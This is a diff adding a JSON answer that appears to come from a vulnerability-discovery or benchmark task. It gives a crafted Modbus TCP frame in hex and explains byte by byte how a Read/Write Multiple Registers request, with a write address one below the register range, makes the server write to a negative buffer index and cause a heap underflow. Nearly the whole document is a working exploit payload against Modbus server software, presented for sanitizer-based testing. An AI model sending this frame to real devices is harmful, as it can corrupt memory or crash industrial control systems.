@@ -1,0 +1,7 @@
+```json
+{
+  "hex_bytes": "00 01 00 00 00 0D FF 17 01 60 00 01 01 5F 00 01 02 AA AA",
+  "explanation": "The frame uses function 0x17 (Read/Write Multiple Registers) to trigger an out-of-bounds write.\n- `00 01 00 00 00 0D FF`: MBAP header with Unit ID 255 and PDU length 13.\n- `17`: Function code 0x17.\n- `01 60`: Read starting address 352. This is equal to `start_registers`, so the read mapping address is `352 - 352 = 0`, which passes the check `mapping_address < 0`.\n- `00 01`: Quantity to read is 1. This is valid as `0 + 1 <= 32`.\n- `01 5F`: Write starting address 351. This is the trigger. It is less than `start_registers` (352).\n- `00 01`: Quantity to write is 1. The upper-bound check `(351 + 1) > (352 + 32)` is false, so this check passes.\n- `02`: Write byte count is 2, which is correct for 1 register.\n- `AA AA`: The value to write.\n\nThe vulnerability is that the code calculates `mapping_address_write = write_addr - start_registers` (which becomes `351 - 352 = -1`) but never checks if this result is negative. The write loop then attempts to access `tab_registers[-1]`, causing a heap buffer underflow.",
+  "expected_effect": "A sanitizer (like ASan) should report a heap-buffer-overflow on a write operation, specifically at a negative offset relative to the start of the `tab_registers` buffer."
+}
+```
